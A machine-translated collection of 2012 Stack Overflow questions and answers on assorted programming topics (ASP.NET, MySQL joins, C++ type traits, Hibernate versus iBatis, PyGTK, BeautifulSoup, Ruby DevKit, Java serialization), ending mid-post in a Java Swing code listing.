在 asp.net webfrom 中是否有可能获取事件处理程序的名称，女巫将用于处理用户请求`HttpModule`：例如，如果用户单击一个按钮`btn`，我想将其`btn_Click`作为事件处理程序的名称。这样，如果不允许他这样做，我可以限制他

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T14:19:15.927

您解决权限问题的方法过于复杂。有更多标准的方法来决定用户是否可以执行某个操作，例如在事件处理程序本身中编写合适的逻辑，不将控件呈现给未经授权的用户，以及使用属性来限制谁可以执行您的方法，根据他的权限。
[本文](http://www.asp.net/web-forms/tutorials/security/roles/role-based-authorization-cs)从所有可能的角度对其进行了描述

你的实现也是可能的，并且检查一个按钮是否被点击就足够了（你为什么关心事件处理程序？你只需要知道按钮被点击了，你可以从底层的 Request 对象中获取这个信息），但是这对于 ASP.NET 中的标准任务来说确实是一种过度杀伤力

# android - 保护安卓设备

> ID：10862676
> 
> 赞同：2
> 
> 时间：2012-06-02T13:29:23.337
> 
> 标签：android

有没有办法保护安卓设备

*   用户不再能够下载/安装其他应用程序？

这个想法是借出带有特定应用程序的设备。

理想情况下，所有者（就是我）应该能够使用密码/密码短语来删除保护

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:33:19.020

不，不要认为它可以在库存设备上完成。

如果有办法，它可能在[设备管理 API中](http://developer.android.com/guide/topics/admin/device-admin.html)

但很可能，如果您想实现这一点，您至少需要一个有根设备，甚至可能需要您自己定制的操作系统构建来支持它。

# shell - Shell：读取文件并将其内容回显到另一个文件

> ID：10862678
> 
> 赞同：13
> 
> 时间：2012-06-02T13:30:39.453
> 
> 标签：shell

我有一个 Makefile，它应该将别名从另一个文件回显到您的本地`.zshrc`文件。

我需要读取文件的内容`aliases.sh`，并将其内容回显到`~/.zshrc`，这怎么可能？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-06-02T13:38:55.860

```
cat aliases.sh >> ~/.zshrc 
```

# mysql - MySQL - 我如何让我的查询来做到这一点？

> ID：10862680
> 
> 赞同：2
> 
> 时间：2012-06-02T13:30:55.333
> 
> 标签：mysql, subquery

我想要做的是按相似性/相似性排序问题，然后根据`Result`表格中的点从 `Point`表格中获取结果。

**示例**：查询 = '德国位置'

**我有以下表格：**

表问题

```
+---------+-----------+---------------+---------------------------------+
| ques_id  | question                                                   |
+---------+-----------+---------------+---------------------------------+
|     1    |  Where is Germany located                                  |
+---------+-----------+---------------+---------------------------------+
|     2    |  where is Germany located on a map                         |
+---------+-----------+---------------+---------------------------------+
|     3    |  where is Germany located in Europe                        |
+---------+-----------+---------------+---------------------------------+ 
```

表格结果

```
+---------+-----------+---------------+---------------------------------+
| resu_id  | result                                                     |
+---------+-----------+---------------+---------------------------------+
|     1    |  Germany is located in Europe                              |
+---------+-----------+---------------+---------------------------------+
|     2    |  Northern hemisphere in Europe                             |
+---------+-----------+---------------+---------------------------------+
|     3    |  between France & Poland                                   |
+---------+-----------+---------------+---------------------------------+
|     4    |  Germany is located in central Europe                      |
+---------+-----------+---------------+---------------------------------+
|     5    |  South of Denmark                                          |
+---------+-----------+---------------+---------------------------------+
|     6    |  52 degrees North, 13 degrees East                         |
+---------+-----------+---------------+---------------------------------+
|     7    |  located on the continent of Europe                        |
+---------+-----------+---------------+---------------------------------+ 
```

表点

```
+---------+-----------+-----------+-----------+
| pont_id |  ques_id  |  resu_id  |  point    |
+---------+-----------+-----------+-----------+
|    1    |     2     |     6     |    10     |
+---------+-----------+-----------+-----------+
|    2    |     1     |     1     |    8      |
+---------+-----------+-----------+-----------+
|    3    |     2     |     7     |    7      |
+---------+-----------+-----------+-----------+
|    4    |     3     |     5     |    9      |
+---------+-----------+-----------+-----------+
|    5    |     3     |     4     |    8      |
+---------+-----------+-----------+-----------+
|    6    |     1     |     7     |    10     |
+---------+-----------+-----------+-----------+
|    7    |     3     |     2     |    6      |
+---------+-----------+-----------+-----------+
|    8    |     2     |     3     |    4      |
+---------+-----------+-----------+-----------+ 
```

我尝试过了

```
SELECT resu_id FROM `Point` WHERE ques_id is (**?**) ORDER BY `point` 
```

**期待结果**

```
+---------+-----------+-----------+--------------------------------------------+
| ques_id |  resu_id  |  point    |    result                                  |
+---------+-----------+-----------+--------------------------------------------+
|    1    |     7     |     10    |    located on the continent of Europe      |
+---------+-----------+-----------+--------------------------------------------+
|    1    |     1     |     8     |    Germany is located in Europe            |
+---------+-----------+-----------+--------------------------------------------+
|    2    |     6     |     10    |    52 degrees North, 13 degrees East       |
+---------+-----------+-----------+--------------------------------------------+
|    2    |     7     |     7     |    located on the continent of Europe      |
+---------+-----------+-----------+--------------------------------------------+
|    2    |     3     |     4     |    between France & Poland                 |
+---------+-----------+-----------+--------------------------------------------+
|    3    |     5     |     9     |    South of Denmark                        |
+---------+-----------+-----------+--------------------------------------------+
|    3    |     4     |     8     |    Germany is located in central Europe    |
+---------+-----------+-----------+--------------------------------------------+
|    3    |     2     |     6     |    Northern hemisphere in Europe           |
+---------+-----------+-----------+--------------------------------------------+ 
```

按相关性对问题进行排序，然后根据分值对相应的结果进行排序。

谢谢大家的帮助，不要对我苛刻:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T10:56:49.790

如果您正在寻找相关的结果数据，您可以尝试以下查询：

```
select 
   p.ques_id, p.resu_id, p.point,
--   q.question,
   r.result -- , p.pont_id
from
   result r
   inner join point p on ( r.resu_id=p.resu_id )
--   inner join question q on ( q.ques_id=p.ques_id and q.ques_id=? ) -- // use this if required
   inner join question q on ( q.ques_id=p.ques_id )
order by 
   q.ques_id, p.point desc, r.result desc
; 
```

上述查询执行的输出：

```
+---------+---------+-------+--------------------------------------+
| ques_id | resu_id | point | result                               |
+---------+---------+-------+--------------------------------------+
|       1 |       7 |    10 | located on the continent of Europe   |
|       1 |       1 |     8 | Germany is located in Europe         |
|       2 |       6 |    10 | 52 degrees North, 13 degrees East    |
|       2 |       7 |     7 | located on the continent of Europe   |
|       2 |       3 |     4 | between France & Poland              |
|       3 |       5 |     9 | South of Denmark                     |
|       3 |       4 |     8 | Germany is located in central Europe |
|       3 |       2 |     6 | Northern hemisphere in Europe        |
+---------+---------+-------+--------------------------------------+
8 rows in set (0.00 sec) 
```

删除`select`您不想再次选择的字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:39:13.123

我相信你想要这个::

```
 SELECT result 
  FROM Result 
  inner join Point on (Result.resul_id=Point.resul_id)
  WHERE Point.ques_id = ? ORDER BY Point.point desc limit 1 
```

# c++ - 在 C++ 中使用模板函数确定 constness

> ID：10862681
> 
> 赞同：5
> 
> 时间：2012-06-02T13:30:57.237
> 
> 标签：c++, templates, constants

我想使用模板函数确定类型是否为 const，例如：

```
template <typename TTYPE> bool IsConst(TTYPE) {return false;}

template <typename TTYPE> bool IsConst(const TTYPE) {return true;} 
```

但这不起作用，有什么替代建议吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-02T13:37:12.087

您正在寻找的是[`std::is_const`](http://en.cppreference.com/w/cpp/types/is_const). 如果您给它的类型是 const，`value`则将是`true`. 如果没有，`value`将是`false`。

这是您可以在该页面上找到的示例：

```
#include <iostream>
#include <type_traits> //needed for is_const

int main() 
{
    std::cout << boolalpha; //display true/false, not 1/0
    std::cout << std::is_const<int>::value << '\n'; //int isn't const
    std::cout << std::is_const<const int>::value  << '\n'; //const int is const
} 
```

输出：

```
false
true 
```

由于您尝试自己制作，因此我建议您查看提供的可能实现以了解这些东西是如何工作的，以防您将来确实需要制作一个。这是一次很好的学习经历。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-04T12:24:52.810

考虑以下代码：

```
#include <iostream>

template<typename T>
struct isConst
{
    static bool result;
};

template<typename T>
struct isConst<const T>
{
    static bool result;
};

template<typename T>
bool isConst<T>::result = false;

template<typename T>
bool isConst<const T>::result = true;

int main()
{
    std::cout << std::boolalpha;

    std::cout << isConst<int>::result << "\n";
    std::cout << isConst<const int>::result << "\n";
    std::cout << isConst<const char>::result << "\n";
    std::cout << isConst<char*>::result << "\n";
    std::cout << isConst<const float>::result << "\n";

    return 0;
} 
```

我用模板专业化解决了你的问题。何时自动`T`调用`const`专用（第二）版本。如果您编译并运行此代码，您将获得：

```
false
true
true
false
true 
```

您的版本不起作用，因为您重新定义了`IsConst`函数（它被禁止并导致编译器错误）

**注意：**`result()`我用静态变量更改了函数。它也有效，而且速度更快。

# spring - Hibernate、iBatis、Spring JDBC Template，该用哪一个？

> ID：10862682
> 
> 赞同：2
> 
> 时间：2012-06-02T13:30:59.033
> 
> 标签：spring, hibernate, orm, ibatis

我正在用java开发一个网络应用程序。我正在考虑使用 Spring MVC。但在 ORM 方面，我有一个决定要做。我研究过诸如 Hibernate、iBatis、Spring JDBC 模板等 ORM。

我发现 iBatis 和 Spring JDBC 模板（使用 RowMapper）几乎相同，您将每个查询映射到一个对象。所以你必须为每个查询编写一个类。

在 Hibernate 中，您将每个表映射到一个类。它减少了编写 SQL 的需要。

我想当你不擅长 SQL 时，Hibernate 更可取。在我的情况下，我对 SQL 很熟悉，所以想使用 iBatis 或 Spring JDBC 模板，它们可以让我很好地控制 SQL，而且这些都没有 Hibernate 复杂。

但是 Hibernate 提供了其他 ORM 不提供的缓存。

所以我的问题：

1.  在 iBatis 和 Spring JDBC Template 之间使用哪一个？
2.  Hibernate 缓存（或我不知道的任何其他 Hibernate 功能）是否如此好，以至于我应该使用 Hibernate 而不是其他 ORM？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T16:49:09.453

> 我想当你不擅长 SQL 时，Hibernate 更可取

我不同意您应该使用 Hibernate 或任何其他 ORM 的想法，因为您不太擅长 SQL。

虽然 Hibernate 确实会为您生成 SQL，但不了解它在做什么会导致性能灾难。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-02T17:01:16.483

作为一名 Hibernate 开发人员，我也非常擅长 SQL；）事实上，我职业生涯的开始是专门研究关系（甚至是一些前关系）数据库。无论如何，我真的不明白手写 SQL 是“更易于维护”或提供“更好的控制”的误解。但是，如果您确实接受了这种误解，那么您实际上可以告诉 Hibernate 您希望它用于与每个实体相关的所有 CRUD 操作的 SQL（请参阅`@SQLInsert`、`@SQLUpdate`等）。

同样，我发现这几乎不是可维护的。就个人而言，我宁愿让 Hibernate 为我管理 INSERT/UPDATE/DELETE SQL。另一方面，加载数据是我通常需要更多控制的情况。但是 Hibernate（以及一般的 JPA 提供者）已经通过 HQL/JPQL 和 Criteria 查询为您提供了这种控制。在我看来，如果你依赖 Session.get 你只是在要求糟糕的表现。这与使用 O/RM 无关。这不是一个好的数据加载计划，因为您需要的数据量（甚至与同一实体相关）因应用程序用例而异。例如，为下拉列表加载员工需要的数据量与生成部门名册的数据量大不相同。这就是控制。

一定要使用让您感觉最舒适并满足应用程序目标/要求的东西。只需确保您在技术和产品之间的比较点是真实的，而不仅仅是误解。

缓存对于 O/RM 来说是一个公平的观点。事实上，JPA（从 2.0 开始）需要某种程度的缓存。但是，请注意，在 O/RM 级别进行缓存通常会导致性能下降。您确实需要了解要缓存的特定数据的语义。有些数据适合缓存，有些则不是。此外，缓存“高于” O/RM 级别通常要好得多。

就我个人而言，我会选择 Hibernate，因为我相信 (1) 它在抽象之间取得了最佳平衡，同时仍然可以访问 SQL 功能（这在很大程度上适用于 JPA 提供程序）和 (2) 它具有任何持久性中最完整的特性集供应商在那里。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T16:58:38.710

好吧，您的选择应该取决于您开发应用程序的目的。我会说 Hibernate 是上述 ORM 中更强大的，并且拥有强大的社区，并且缓存非常强大。但真正强大的缓存有时会成为问题，并且会占用大量内存。

我是 myBatis 用户，相信它是一个中途并提供你需要的一切。好吧，myBatis 将是我个人对 Spring JDBC 模板的选择。

# c# - 从 asp.net 页面运行 cmd 或 exe 文件

> ID：10862685
> 
> 赞同：3
> 
> 时间：2012-06-02T13:31:11.340
> 
> 标签：c#, asp.net, iis-7

我在从 asp.net 页面运行 cmd 或 exe 文件时遇到问题。

我使用了这段代码：

```
protected void btnRun_OnClick(object sender, EventArgs e)
{
  var p = new Process();
  var info = new ProcessStartInfo
                            {
                              FileName = Server.MapPath("~/print.cmd"),
                              UseShellExecute = false,
                              WindowStyle = ProcessWindowStyle.Hidden,
                            };
  p.StartInfo = info;
  p.Start();
  p.WaitForExit();
} 
```

当我在 VS Development Server 上运行我的 Web 应用程序时，一切正常，但是当我在 IIS（7.5 版）上部署此代码时，代码可以正常工作但没有任何反应。

*   我在 google 和 SO 上使用了搜索，但我没有找到任何解决方案
*   我试过[http://support.microsoft.com/kb/555134](http://support.microsoft.com/kb/555134)和[http://support.microsoft.com/default.aspx?scid=kb;en-us;317012](http://support.microsoft.com/default.aspx?scid=kb;en-us;317012)
*   我为 IIS Admin 服务设置了“允许服务与 desctop 交互”。
*   我玩过用户权限，但这并没有给我任何结果。
*   我更改了应用程序池的身份

是否可以使用 IIS 运行 cmd 或 exe？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T13:40:36.717

尝试：

```
var info = new ProcessStartInfo
                        {
                          FileName = Server.MapPath("~/print.cmd"),
                          UseShellExecute = true,
                          Verb = "runas",
                          WindowStyle = ProcessWindowStyle.Hidden,
                        }; 
```

# php - 如何在 php 中制作访客计数器？

> ID：10862686
> 
> 赞同：0
> 
> 时间：2012-06-02T13:31:15.973
> 
> 标签：php, mysql, counter, visitor-statistic, visitors

我如何计算访问者？我想在打开页面时插入，在关闭或离开页面时插入，但不是 onunload 我不想在刷新页面时插入，下面的代码帮助我在打开页面时插入，但在关闭时没有帮助

```
session_start();
if (!isset($_SESSION["visits"]))
    $_SESSION["visits"] = 0;
if ($_SESSION["visits"] > 1){
    echo 'visit='.$_SESSION["visits"];
    echo "You hit the refresh button!";}
else{
    mysql_query(
        "INSERT INTO najd_visit( visit_userId, visit_staticId, visit_page,
            visit_enterTime)VALUES ('$userId', '$Sid', '$title', '$date') ");
    $_SESSION["visits"] = $_SESSION["visits"] + 1;
    echo 'visit='.$_SESSION["visits"];
    echo "This is my site";
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:37:37.503

要使用`$_SESSION`，您需要`session_start()`事先致电某处。

我认为代码应该是这样的：

```
session_start();
if ( !isset($_SESSION['visited']) )
{
    echo "This is your first visit.";
    $_SESSION['visited'] = TRUE;

    // Do the MySQL query here
} else {
    echo "You hit the refresh button.";
}

echo "This is my site."; 
```

这样，当一个新用户第一次访问您的站点（使用新会话）时，他/她的访问将存储在数据库中，我们将在会话集中有一个变量，因此在刷新按钮后，有关访问的信息不会再次添加到数据库中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:33:52.717

尝试添加 session_start() 来处理您的会话请求。

[http://php.net/manual/en/function.session-start.php](http://php.net/manual/en/function.session-start.php)

# c# - Facebook 使用 Visual Web Developer 2010 遇到的麻烦

> ID：10862687
> 
> 赞同：0
> 
> 时间：2012-06-02T13:31:19.587
> 
> 标签：c#, facebook, visual-web-developer-2010

如果这是您在该主题上看到的 100 篇帖子，我很抱歉，但到目前为止我找不到有帮助的帖子。

我正在尝试在 Visual Web Developer 2010 express 上进行简单项目，该项目登录到 facebook 中的给定用户名并为他输入状态（2 个文本框用于用户名和密码，另一个用于文本作为状态，并且一个按钮开始）

如果不创建 facebook 应用程序并使用 app_id 和 facebook 个人插件进行登录，我找不到这样做的方法。

有人可以帮我解决这个问题吗？代码示例或我现在可以实现的东西，这个小项目是为了我在 2 天内进行的工作审查

谢谢您的帮助 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:37:02.273

我不确定这一点，但...

我会为此制作一个 facebook 应用程序。

您还可以搜索页面并使用 jQuery 查找元素。我不确定文本框上控件的 id 是否改变了那么多。

再次。没有把握。只是一些猜测。你可以在这里找到关于 facebook api 的有价值的信息[http://developers.facebook.com/docs/reference/php/facebook-api/](http://developers.facebook.com/docs/reference/php/facebook-api/)

这是另一种选择，可能是正确的方法。你能提供更多细节吗？

# c# - 通用参数基类型：“没有从 B 到 A 的隐式引用转换”

> ID：10862690
> 
> 赞同：3
> 
> 时间：2012-06-02T13:32:02.260
> 
> 标签：c#, generics, type-constraints

```
[Serializable]
public abstract class A
{
    public A()
    {

    }
}

[Serializable]
public class B : A
{
    public B() : base()
    {

    }
} 
```

在扩展中：

```
public static T NextRecord<T>(this SqlDataReader reader) where T : A, new()
{
    // Do work
} 
```

我这样称呼这个扩展：

```
B b = reader.NextRecord<B>(); 
```

然而，我得到了这个例外：“没有从'B'到'A'的隐式引用转换。”

我究竟做错了什么？

谢谢。

**编辑**

```
public static T NextRecord<T>(this SqlDataReader reader) where T : A, new()
{
    // Make sure we have been given a correct Type
    if (!typeof(T).BaseType.Equals(typeof(A)))
    {
        throw new Exception("Supplied Type is not derived from Type A");
    }

    if (reader.IsNull())
    {
        throw new ArgumentNullException("reader is null");
    }

    if (reader.HasRows)
    {
        if (reader.Read())
        {
            // Instance a object of the type, passing it the SqlDataReader so that it can populate itself   
            return Activator.CreateInstance(typeof(T), new object[] { reader }) as T;
        }
    }

    return null;
} 
```

这是扩展的代码

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T23:25:26.353

仍然有这个问题，尽管我通过将 where T : A 更改为 where T : class 解决了这个问题。

我有第二个问题：

```
public class SomeOtherClass
{
    public static void Test(SomeClassBase obj)
    {

    }
}

public abstract class SomeClassBase
{
    public SomeClassBase()
    {
        SomeOtherClass.Test(this);
    }
}

public class SomeClass : SomeClassBase
{
    public SomeClass() : base()
    {

    }
} 
```

我得到这个例外：

“'Namespace.SomeOtherClass.Test(Namespace.SomeClass)' 的最佳重载方法匹配有一些无效参数”

但是，从 ctor 中删除方法调用并在外部调用它会起作用，如下所示：

SomeClass s = new SomeClass(); SomeOtherClass.Test(s);

甚至将方法更改为：

```
public static void Test(SomeClass obj)
{

} 
```

将失败 ：（

如果我将方法调用移动到派生类ctor ...

# python - could not add table inside vbox pygtk

> ID：10862692
> 
> 赞同：0
> 
> 时间：2012-06-02T13:32:49.640
> 
> 标签：python, pygtk, widget

I have this code to add table inside VBox which is not working

```
topwid=gtk.VBox(gtk.FALSE, 0)

table = gtk.Table(3, 3, True)
topwid.pack_start(table) 
```

how to do this?

Source code(GUI part):

```
def build_gui(self):
    self.window = gtk.Window(gtk.WINDOW_TOPLEVEL)
    self.window.connect("delete_event", self.gotoTray)
    self.window.connect("destroy", self.destroy)
    self.window.set_border_width(24)
    self.window.set_size_request(400, 200)
    self.window.set_title("xyz client")
    self.window.set_position(gtk.WIN_POS_CENTER_ALWAYS)
    self.window.set_resizable(False)

    topwid=gtk.VBox(gtk.FALSE, 0)

    table = gtk.Table(3, 3, True)
    topwid.pack_start(table)

    label = gtk.Label("Username")
    table.attach(label,0,1,0,1)
    label.show()

    self.username=gtk.Entry(max=10)
    table.attach(self.username,1,3,0,1)
    self.username.show()

    label1 = gtk.Label("Password")
    table.attach(label1,0,1,1,2)
    label1.show()

    self.password=gtk.Entry(max=10)
    table.attach(self.password,1,3,1,2)
    self.password.set_visibility(False)
    self.password.show()

    self.button=gtk.Button("Login")
    self.button.connect("clicked",self.click_button)
    table.attach(self.button,1,3,2,3)
    self.button.show()

    #

    table.show()

    mb = gtk.MenuBar()

    filemenu = gtk.Menu()
    filem = gtk.MenuItem("File")
    filem.set_submenu(filemenu)

    exit = gtk.MenuItem("Exit")
    exit.connect("activate", gtk.main_quit)
    filemenu.append(exit)

    mb.append(filem)
    vbox = gtk.VBox(False, 2)
    vbox.pack_start(mb, False, False, 0)
    topwid.pack_start(vbox)

    topwid.show()

    self.statusicon = gtk.status_icon_new_from_stock(gtk.STOCK_NETWORK)
    self.statusicon.connect('activate', self.status_clicked )
    self.statusicon.set_name("Cyberoam")

    self.window.show_all()

    gtk.main() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:47:37.980

Could do with seeing some more of the source code to really be sure but are you calling `show_all` on the window object?

Below is an example of it working.

```
import pygtk
pygtk.require('2.0')
import gtk

class Base:
    def __init__(self):
        self.window = gtk.Window(gtk.WINDOW_TOPLEVEL)
        vbox=gtk.VBox(False, 0)

        table = gtk.Table(3, 3, True)
        table.attach(gtk.Button("1"), 0, 1, 0, 1)
        vbox.pack_start(table)

        self.window.add(vbox)

        self.window.show_all()

  def main(self):
      gtk.main()

if __name__ == "__main__":
    base = Base()
    base.main() 
```

# java - Java 通用可序列化、可迭代堆栈

> ID：10862694
> 
> 赞同：0
> 
> 时间：2012-06-02T13:33:01.260
> 
> 标签：java, generics, serialization, stack

以下是我序列化和反序列化通用堆栈
**反序列化方法的程序片段**

```
public Stack<?> readAll(Path aPath){
    Stack<?> temp = new Stack<>();
    try(ObjectInputStream readStream = new ObjectInputStream(new BufferedInputStream(Files.newInputStream(aPath)))) {
        temp = (Stack<?>) readStream.readObject();
    }catch(EOFException e) {
        e.printStackTrace();
        System.out.println("EOF");
    }catch(IOException | ClassNotFoundException e) {
        e.printStackTrace();
        System.exit(1);
    }
    return temp;
} 
```

**序列化方法**

```
public void writeAll(Path aPath) {
    try(ObjectOutputStream writeStream = new ObjectOutputStream(new BufferedOutputStream(Files.newOutputStream(aPath)))) {
        writeStream.writeObject(this);
    }catch(IOException e) {
    e.printStackTrace();
    }
} 
```

**数据如何序列化和反序列化**

```
import java.nio.file.*;
public class StackTrial {
    public static void main(String[] args) {
        String[] names = {"A","B","C","D","E"};
        Stack<String> stringStack = new Stack<>(); //Stack that will be Serialized
        Stack<String> readStack = new Stack<>(); //Stack in which data will be read
        Path aPath = Paths.get("C:/Documents and Settings/USER/Beginning Java 7/Stack.txt");//Path of file

        for(String name : names) { //pushing data in
            stringStack.push(name);
        }

        for(String a : stringStack) { //displaying content
            System.out.println(a);
        }
        stringStack.writeAll(aPath); //Serialize
        readStack = (Stack<String>) readStack.readAll(aPath);//Deserialize

        for(String a : readStack) { //Display the data read
            System.out.println(a);
        }
    }
} 
```

*问题：* readAll() 方法的返回类型是否真的在做任何事情来提供灵活性，或者如果我将其更改为这无关紧要`Stack<T>` 我的逻辑是，在读取文件时可能有可能写入文件的数据可能是`Stack<Integer>`这样的回来可能会引起麻烦

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:43:45.090

编译器不可能检查您读取的内容是 a `Stack<Integer>`、 a`Stack<String>`还是 a `Stack<Whatever>`。所以最后，*你*必须知道堆栈中有什么，你必须决定堆栈的类型。剩下的就是语法糖。

如果你这样离开它，并且你知道你正在阅读 a `Stack<Integer>`，你将不得不写

```
Stack<Integer> stack = (Stack<Integer>) readAll(path); 
```

如果你把它写成

```
public <T> Stack<T> readAll(Path aPath) {...} 
```

编译器可以从变量的声明中推断出类型，因此您可以编写

```
Stack<Integer> stack = readAll(path); 
```

但最终，结果是一样的。如果从堆栈中获取 Integer 不是真正的`Stack<Integer>`.

# ruby - 尝试在 Windows 7 中为 ruby 安装开发工具包但失败

> ID：10862695
> 
> 赞同：3
> 
> 时间：2012-06-02T13:33:02.103
> 
> 标签：ruby, windows, windows-7

我正在尝试为 vim 的 CommandT 插件安装用于 ruby​​ 的开发工具包，但我遇到了

```
C:\Users\Administrator>gem install rdiscount --platform=ruby
ERROR:  Error installing rdiscount:
        The 'rdiscount' native gem requires installed build tools.

Please update your PATH to include build tools or download the DevKit
from 'http://rubyinstaller.org/downloads' and follow the instructions
at 'http://github.com/oneclick/rubyinstaller/wiki/Development-Kit' 
```

我已经运行了安装 devkit，如下所示

```
C:\devkit>ruby dk.rb init
[INFO] found RubyInstaller v1.9.3 at C:/Ruby193

Initialization complete! Please review and modify the auto-generated
'config.yml' file to ensure it contains the root directories to all
of the installed Rubies you want enhanced by the DevKit.

C:\devkit>ruby dk.rb review
Based upon the settings in the 'config.yml' file generated
from running 'ruby dk.rb init' and any of your customizations,
DevKit functionality will be injected into the following Rubies
when you run 'ruby dk.rb install'.

C:/Ruby193

C:\devkit>ruby dk.rb install
[INFO] RubyGems override already in place for C:/Ruby193, skipping.
[WARN] DevKit helper library already exists for C:/Ruby193, skipping. 
```

可能出了什么问题？

**编辑：**我试过

```
c:\devkit>ruby dk.rb install --force

Configures an MSYS/MinGW based Development Kit (DevKit) for
each of the Ruby installations on your Windows system. The
DevKit enables you to build many of the available native
C-based RubyGems that don't yet have a binary gem.

Usage: ruby dk.rb COMMAND

where COMMAND is one of:

  init     prepare DevKit for installation
  review   review DevKit install plan
  install  install required DevKit executables 
```

卸载并使用干净的目录再次安装。但错误仍然是一样的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-02T14:21:22.327

在这行：

```
C:\devkit>ruby dk.rb install
[INFO] RubyGems override already in place for C:/Ruby193, skipping.
[WARN] DevKit helper library already exists for C:/Ruby193, skipping. 
```

它告诉你它没有安装 DevKit for Ruby，因为它已经有一个以前注册的 DevKit。

您可能重新定位了之前安装的 DevKit，在这种情况下，您需要执行`ruby dk.rb install --force`覆盖它之前跳过的 RubyGems 和 DevKit 帮助程序脚本。

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-15T07:34:52.067

我在安装 ruby​​ dk.rb 时遇到了同样的问题，但是，正如 --force 选项所建议的那样，它已成功安装了我的 devkit，这反过来又解决了我在使用 JSON 1.4.6 gem 时遇到的 gem 安装失败。

# python - 如何遍历 Beautiful Soup 元素以获取属性值

> ID：10862699
> 
> 赞同：1
> 
> 时间：2012-06-02T13:33:41.983
> 
> 标签：python, xml, beautifulsoup

我需要遍历 Beautiful Soup 元素并获取属性值： 对于 XML 文档：

```
<?xml version="1.0" encoding="UTF-8"?>

<Document>
    <Page x1="71" y1="120" x2="527" y2="765" type="page" chunkCount="25"
        pageNumber="1" wordCount="172">
        <Chunk x1="206" y1="120" x2="388" y2="144" type="unclassified">
            <Word x1="206" y1="120" x2="214" y2="144" font="Times-Roman" style="font-size:22pt">K</Word>
            <Word x1="226" y1="120" x2="234" y2="144" font="Times-Roman" style="font-size:22pt">O</Word>
        </Chunk>
     </Page>
</Document> 
```

我想获得“Word”元素（206,226）的 x1 值。帮助很大！

编辑：我试过：

```
for i in soup.page.chunk:
    i.word['x1'] 
```

返回错误：

```
File "C:\Python26\lib\site-packages\BeautifulSoup.py", line 473, in __getattr__
    raise AttributeError, "'%s' object has no attribute '%s'" % (self.__class__.__name__, attr)
AttributeError: 'NavigableString' object has no attribute 'word' 
```

尽管：

```
soup.page.chunk.word['x1'] 
```

工作正常......并且：

```
for i in soup.page.chunk:
    i.findNext(text=True) 
```

获取元素的文本。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T14:10:11.230

这似乎工作，虽然不是那么优雅：

```
for word in soup.page.chunk.find_all('word'):
    print word['x1'] 
```

嵌套的 find_all 也应该可以工作。但可能最好使用类似 css 的选择（soupselect 或来自 lxml）。

基本上如果我没记错的话`soup.page.chunk`是一个节点，汤标签。所以如果你想要迭代，你必须调用 find_all。

更新。可以采用不同的方法`find_all('word')`，然后根据条件进行过滤，例如`word.parent.name == 'smth'`

[!] 在 BeautifulSoup3（不是 bs4）中应该`findAll`是`find_all`

# java - 应用程序可以在 Windows 上运行，但不能在 Linux 上运行

> ID：10862703
> 
> 赞同：-2
> 
> 时间：2012-06-02T13:34:26.213
> 
> 标签：java, linux, swing, cross-platform, executable-jar

我是 Java 的初学者，并制作了我的第一个项目 Quadratic Equations 求解器。它在 Windows（我开发它的平台）上运行良好，但它也应该在其他平台上运行，（不是吗？）。好吧，这个在Linux（BackBox，PuppyLinux）上不起作用，我试过但它表明它不是可执行文件。此失败的可能原因是什么？

PS我真的是“跨平台”的初学者，尤其是Java。

这是代码：

```
 /*
 * QuadraticEquations.java
 *
 * Created on Mar 17, 2012, 8:37:16 PM
 */
/**
 *
 * @author Afaan
 */
public class QuadraticEquations extends javax.swing.JFrame {

    /** Creates new form QuadraticEquations */
    public QuadraticEquations() {
        initComponents();
    }

    /** This method is called from within the constructor to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        MainPanel = new javax.swing.JPanel();
        HeaderLabel = new javax.swing.JLabel();
        AuthorLabel = new javax.swing.JLabel();
        SubHeaderLabel = new javax.swing.JLabel();
        a_Label = new javax.swing.JLabel();
        b_Label = new javax.swing.JLabel();
        c_Label = new javax.swing.JLabel();
        a_Value = new javax.swing.JTextField();
        b_Value = new javax.swing.JTextField();
        c_Value = new javax.swing.JTextField();
        calc_Button = new javax.swing.JButton();
        ResultLabel = new javax.swing.JLabel();
        Root1_Label = new javax.swing.JLabel();
        Root2_Label = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Quadratic Equations Roots Calculator");

        HeaderLabel.setFont(new java.awt.Font("Lucida Fax", 1, 18)); // NOI18N
        HeaderLabel.setForeground(new java.awt.Color(0, 0, 255));
        HeaderLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        HeaderLabel.setText("Quadratic Equations - Roots Calculator");

        AuthorLabel.setFont(new java.awt.Font("Lucida Fax", 1, 14)); // NOI18N
        AuthorLabel.setForeground(new java.awt.Color(0, 165, 0));
        AuthorLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        AuthorLabel.setText("Afaan Bilal");

        SubHeaderLabel.setFont(new java.awt.Font("Lucida Fax", 1, 12)); // NOI18N
        SubHeaderLabel.setText("Enter the values of 'a', 'b', 'c' : ");

